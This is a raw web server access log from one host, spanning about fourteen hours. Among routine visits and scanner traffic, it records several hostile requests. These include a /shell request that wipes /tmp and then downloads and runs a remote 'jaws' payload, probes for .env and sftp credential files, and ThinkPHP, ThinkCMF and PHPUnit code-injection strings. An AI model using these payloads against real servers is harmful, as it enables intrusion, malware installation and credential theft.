143.110.222.166 - - [19/Jul/2023:15:05:51 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
54.37.79.75 - - [19/Jul/2023:15:17:27 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [19/Jul/2023:15:17:27 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
41.46.160.23 - - [19/Jul/2023:15:43:29 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ testbots.maizhangyu.top/jaws;sh+/tmp/jaws" 400 488 "-" "-"
172.105.128.12 - - [19/Jul/2023:15:46:24 +0000] "\x16\x03\x01" 400 488 "-" "-"
45.79.181.223 - - [19/Jul/2023:15:50:22 +0000] "\x16\x03\x01" 400 488 "-" "-"
185.233.19.149 - - [19/Jul/2023:16:01:56 +0000] "GET / HTTP/1.1" 200 5374 "-" "-"
67.205.155.181 - - [19/Jul/2023:16:06:48 +0000] "GET /1.php HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
67.205.155.181 - - [19/Jul/2023:16:06:48 +0000] "GET /files/ HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
54.37.79.75 - - [19/Jul/2023:16:09:45 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [19/Jul/2023:16:09:45 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [19/Jul/2023:16:10:48 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
95.214.27.160 - - [19/Jul/2023:16:24:22 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 493 "http://159.223.194.74:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
146.19.215.41 - - [19/Jul/2023:16:56:26 +0000] "GET /.env HTTP/1.1" 404 493 "-" "python-requests/2.31.0"
146.19.215.41 - - [19/Jul/2023:16:56:40 +0000] "POST / HTTP/1.1" 200 2052 "-" "python-requests/2.31.0"
54.37.79.75 - - [19/Jul/2023:17:22:36 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [19/Jul/2023:17:22:36 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.104.11.46 - - [19/Jul/2023:17:50:54 +0000] "\x16\x03\x01" 400 488 "-" "-"
54.37.79.75 - - [19/Jul/2023:17:59:50 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [19/Jul/2023:17:59:51 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.79.149.111 - - [19/Jul/2023:18:09:24 +0000] "\x16\x03" 400 488 "-" "-"
45.79.149.111 - - [19/Jul/2023:18:09:24 +0000] "GET /tIEZ HTTP/1.1" 404 456 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
45.79.149.111 - - [19/Jul/2023:18:09:25 +0000] "GET /KWRi HTTP/1.1" 404 456 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
143.110.222.166 - - [19/Jul/2023:18:14:07 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
95.214.27.52 - - [19/Jul/2023:18:17:07 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 493 "http://159.223.194.74:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.128.232.176 - - [19/Jul/2023:18:17:46 +0000] "CONNECT google.com:443 HTTP/1.1" 200 5374 "-" "Go-http-client/1.1"
45.128.232.176 - - [19/Jul/2023:18:17:46 +0000] "\x16\x03\x01" 400 0 "-" "-"
205.210.31.105 - - [19/Jul/2023:19:08:34 +0000] "GET / HTTP/1.0" 200 5393 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
143.110.222.166 - - [19/Jul/2023:19:08:47 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
31.7.60.114 - - [19/Jul/2023:19:09:18 +0000] "GET / HTTP/1.1" 200 2015 "http://159.223.194.74:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
118.126.124.10 - - [19/Jul/2023:19:11:08 +0000] "HEAD / HTTP/1.1" 200 128 "-" "Python/3.6 aiohttp/3.8.3"
118.126.124.10 - - [19/Jul/2023:19:11:09 +0000] "GET / HTTP/1.1" 200 1996 "-" "Python/3.6 aiohttp/3.8.3"
54.37.79.75 - - [19/Jul/2023:19:35:17 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [19/Jul/2023:19:35:17 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
60.2.95.34 - - [19/Jul/2023:19:39:10 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ testbots.maizhangyu.top/jaws;sh+/tmp/jaws" 400 488 "-" "-"
174.138.95.172 - - [19/Jul/2023:19:44:14 +0000] "GET / HTTP/1.0" 200 5393 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
172.105.128.13 - - [19/Jul/2023:19:50:06 +0000] "\x16\x03\x01" 400 488 "-" "-"
143.110.222.166 - - [19/Jul/2023:19:57:57 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
45.156.129.2 - - [19/Jul/2023:19:58:13 +0000] "GET /favicon.ico HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
174.138.95.172 - - [19/Jul/2023:20:07:06 +0000] "GET / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
174.138.95.172 - - [19/Jul/2023:20:07:06 +0000] "GET /favicon.ico HTTP/1.1" 404 492 "http://159.223.194.74/" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
31.7.60.114 - - [19/Jul/2023:20:24:57 +0000] "GET / HTTP/1.1" 200 2015 "http://159.223.194.74:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
54.37.79.75 - - [19/Jul/2023:20:33:50 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [19/Jul/2023:20:33:51 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
85.215.109.6 - - [19/Jul/2023:20:45:34 +0000] "GET /.vscode/sftp.json HTTP/1.1" 404 437 "-" "Mozilla/5.0 (compatible; Konqueror/4.5; NetBSD 5.0.2; X11; amd64; en_US) KHTML/4.5.4 (like Gecko)"
143.110.222.166 - - [19/Jul/2023:21:10:44 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
192.155.90.118 - - [19/Jul/2023:21:50:36 +0000] "\x16\x03\x01" 400 488 "-" "-"
54.37.79.75 - - [19/Jul/2023:21:53:31 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [19/Jul/2023:21:53:32 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [19/Jul/2023:21:57:19 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
64.227.64.251 - - [19/Jul/2023:22:00:54 +0000] "\x16\x03\x01" 400 488 "-" "-"
64.227.64.251 - - [19/Jul/2023:22:00:54 +0000] "\x16\x03\x01" 400 488 "-" "-"
64.227.64.251 - - [19/Jul/2023:22:00:55 +0000] "\x16\x03\x01" 400 488 "-" "-"
64.227.64.251 - - [19/Jul/2023:22:00:56 +0000] "GET /favicon.ico HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
54.37.79.75 - - [19/Jul/2023:22:51:28 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [19/Jul/2023:22:51:28 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.174.160.27 - - [19/Jul/2023:22:58:29 +0000] "\x16\x03\x01" 400 488 "-" "-"
54.174.160.27 - - [19/Jul/2023:22:58:29 +0000] "\x16\x03\x01" 400 488 "-" "-"
54.174.160.27 - - [19/Jul/2023:22:58:29 +0000] "\x16\x03\x01" 400 488 "-" "-"
54.174.160.27 - - [19/Jul/2023:22:58:29 +0000] "GET /robots.txt HTTP/1.1" 404 456 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
54.174.160.27 - - [19/Jul/2023:22:58:29 +0000] "GET /99vt HTTP/1.1" 404 456 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
54.174.160.27 - - [19/Jul/2023:22:58:29 +0000] "GET /aaaaaaaaaaaaaaaaaaaaaaaaaqr HTTP/1.1" 404 456 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
54.174.160.27 - - [19/Jul/2023:22:58:29 +0000] "GET / HTTP/1.1" 200 2015 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
54.174.160.27 - - [19/Jul/2023:22:58:29 +0000] "GET /robots.txt HTTP/1.1" 404 456 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
54.174.160.27 - - [19/Jul/2023:22:58:29 +0000] "\x16\x03\x01" 400 488 "-" "-"
54.174.160.27 - - [19/Jul/2023:22:58:30 +0000] "GET /gate.php HTTP/1.1" 404 456 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
54.174.160.27 - - [19/Jul/2023:22:58:30 +0000] "\x16\x03\x01" 400 488 "-" "-"
54.37.79.75 - - [19/Jul/2023:23:00:46 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [19/Jul/2023:23:00:46 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.241.216.12 - - [19/Jul/2023:23:01:02 +0000] "GET /druid/index.html HTTP/1.1" 404 437 "-" "Mozilla/5.0 zgrab/0.x"
190.145.240.16 - - [19/Jul/2023:23:01:11 +0000] "GET / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
190.145.240.16 - - [19/Jul/2023:23:01:11 +0000] "GET /css/loading.css HTTP/1.1" 200 493 "http://159.223.194.74/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
190.145.240.16 - - [19/Jul/2023:23:01:12 +0000] "GET /favicon.ico HTTP/1.1" 404 492 "http://159.223.194.74/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
191.99.150.144 - - [19/Jul/2023:23:01:40 +0000] "GET / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
191.99.150.144 - - [19/Jul/2023:23:01:41 +0000] "GET /css/loading.css HTTP/1.1" 200 493 "http://159.223.194.74/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
191.99.150.144 - - [19/Jul/2023:23:01:41 +0000] "GET /favicon.ico HTTP/1.1" 404 492 "http://159.223.194.74/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
191.99.150.144 - - [19/Jul/2023:23:03:03 +0000] "POST /index.php HTTP/1.1" 200 2812 "http://159.223.194.74/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
191.99.150.144 - - [19/Jul/2023:23:03:20 +0000] "GET /css/Spinner.gif HTTP/1.1" 200 79300 "http://159.223.194.74/css/loading.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
191.99.150.144 - - [19/Jul/2023:23:03:20 +0000] "POST /generarXml.php HTTP/1.1" 200 237 "http://159.223.194.74/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
191.99.150.144 - - [19/Jul/2023:23:03:30 +0000] "GET /descargar.php HTTP/1.1" 200 2328940 "http://159.223.194.74/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
185.180.143.188 - - [19/Jul/2023:23:05:55 +0000] "GET /favicon-32x32.png HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
143.110.222.166 - - [19/Jul/2023:23:10:00 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
191.99.150.144 - - [19/Jul/2023:23:16:04 +0000] "POST /index.php HTTP/1.1" 200 2052 "http://159.223.194.74/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
191.99.150.144 - - [19/Jul/2023:23:16:12 +0000] "POST /index.php HTTP/1.1" 200 2812 "http://159.223.194.74/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
191.99.150.144 - - [19/Jul/2023:23:16:19 +0000] "POST /generarXml.php HTTP/1.1" 200 237 "http://159.223.194.74/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
191.99.150.144 - - [19/Jul/2023:23:16:30 +0000] "GET /descargar.php HTTP/1.1" 200 2328948 "http://159.223.194.74/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
31.220.1.83 - - [19/Jul/2023:23:17:40 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
191.99.150.144 - - [19/Jul/2023:23:18:32 +0000] "POST /index.php HTTP/1.1" 200 2052 "http://159.223.194.74/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
54.37.79.75 - - [19/Jul/2023:23:43:02 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [19/Jul/2023:23:43:02 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.79.128.205 - - [19/Jul/2023:23:49:10 +0000] "\x16\x03\x01" 400 488 "-" "-"
91.224.92.16 - - [19/Jul/2023:23:55:47 +0000] "GET / HTTP/1.1" 200 5374 "-" "-"
54.37.79.75 - - [20/Jul/2023:00:00:26 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [20/Jul/2023:00:00:26 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [20/Jul/2023:00:00:29 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
92.118.39.40 - - [20/Jul/2023:00:29:47 +0000] "GET / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
31.7.60.114 - - [20/Jul/2023:00:35:10 +0000] "GET / HTTP/1.1" 200 2015 "http://159.223.194.74:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
35.203.210.117 - - [20/Jul/2023:00:39:22 +0000] "GET / HTTP/1.1" 200 5374 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
51.79.29.48 - - [20/Jul/2023:00:42:54 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [20/Jul/2023:00:42:54 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [20/Jul/2023:01:06:46 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
41.141.13.250 - - [20/Jul/2023:01:17:53 +0000] "GET / HTTP/1.1" 200 5374 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
31.7.60.114 - - [20/Jul/2023:01:20:41 +0000] "GET / HTTP/1.1" 200 2015 "http://159.223.194.74:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
213.109.202.66 - - [20/Jul/2023:01:51:04 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 456 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
66.175.213.4 - - [20/Jul/2023:01:53:46 +0000] "\x16\x03\x01" 400 488 "-" "-"
184.105.247.196 - - [20/Jul/2023:01:58:08 +0000] "\x16\x03\x01" 400 488 "-" "-"
143.110.222.166 - - [20/Jul/2023:02:02:16 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.180.143.138 - - [20/Jul/2023:02:08:14 +0000] "GET /favicon.ico HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
112.206.110.164 - - [20/Jul/2023:02:16:29 +0000] "GET / HTTP/1.1" 200 5374 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
213.109.202.66 - - [20/Jul/2023:02:41:10 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 456 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
51.79.29.48 - - [20/Jul/2023:02:59:01 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [20/Jul/2023:02:59:01 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [20/Jul/2023:03:20:31 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
213.109.202.66 - - [20/Jul/2023:03:21:25 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 456 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
213.109.202.66 - - [20/Jul/2023:03:24:29 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 456 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.227.254.48 - - [20/Jul/2023:03:28:39 +0000] "\x03" 400 488 "-" "-"
142.93.239.112 - - [20/Jul/2023:03:50:16 +0000] "GET /client/get_targets HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
142.93.239.112 - - [20/Jul/2023:03:50:17 +0000] "GET /geoip/ HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
142.93.239.112 - - [20/Jul/2023:03:50:17 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Snapchat/10.77.0.54 (like Safari/604.1)"
45.79.181.104 - - [20/Jul/2023:03:50:26 +0000] "\x16\x03\x01" 400 488 "-" "-"
109.237.98.226 - - [20/Jul/2023:03:50:30 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [20/Jul/2023:03:50:30 +0000] "\x16\x03\x01\x01H\x01" 400 488 "-" "-"
51.79.29.48 - - [20/Jul/2023:04:05:16 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [20/Jul/2023:04:05:16 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [20/Jul/2023:04:08:53 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
213.109.202.66 - - [20/Jul/2023:04:11:05 +0000] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 200 2015 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
65.49.20.69 - - [20/Jul/2023:04:30:40 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0"
65.49.20.69 - - [20/Jul/2023:04:33:13 +0000] "GET /favicon.ico HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
65.49.20.69 - - [20/Jul/2023:04:34:13 +0000] "GET /geoserver/web/ HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0"
213.109.202.66 - - [20/Jul/2023:04:36:07 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 2015 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
192.241.209.153 - - [20/Jul/2023:04:53:00 +0000] "MGLNDD_159.223.194.74_80\n" 400 488 "-" "-"
